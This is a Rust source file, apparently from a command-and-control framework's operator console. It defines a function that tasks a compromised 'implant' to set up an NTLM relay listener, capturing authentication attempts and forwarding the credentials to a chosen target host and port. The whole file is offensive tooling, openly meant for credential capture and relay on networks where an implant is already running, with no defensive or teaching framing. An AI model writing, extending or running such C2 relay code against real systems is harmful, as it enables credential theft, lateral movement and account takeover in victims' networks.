//! NTLM relay attack commands

use anyhow::Result;
use common::ImplantId;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Set up an NTLM relay listener that forwards captured credentials to a target
///
/// `listener_host` and `listener_port` define where authentication attempts are captured.
/// `target_host` and `target_port` define the downstream service to relay credentials to.
/// `protocol` is optional (e.g. "smb", "http") and defaults to the implant-side value when omitted.
pub async fn setup(
    cli: &CliState,
    listener_host: &str,
    listener_port: &str,
    target_host: &str,
    target_port: &str,
    protocol: Option<String>,
) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!(
        "Setting up NTLM relay: {}:{} -> {}:{}",
        listener_host, listener_port, target_host, target_port
    ));

    let mut task_data = b"setup\0".to_vec();
    task_data.extend_from_slice(listener_host.as_bytes());
    task_data.push(0);
    task_data.extend_from_slice(listener_port.as_bytes());
    task_data.push(0);
    task_data.extend_from_slice(target_host.as_bytes());
    task_data.push(0);
    task_data.extend_from_slice(target_port.as_bytes());
    if let Some(proto) = protocol {
        task_data.push(0);
        task_data.extend_from_slice(proto.as_bytes());
    }

    let task_id = cli.client.dispatch_task(implant_id, "ntlm_relay", task_data).await?;
    print_success(&format!("NTLM relay setup task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Relay will capture credentials on next authentication attempt");

    Ok(())
}
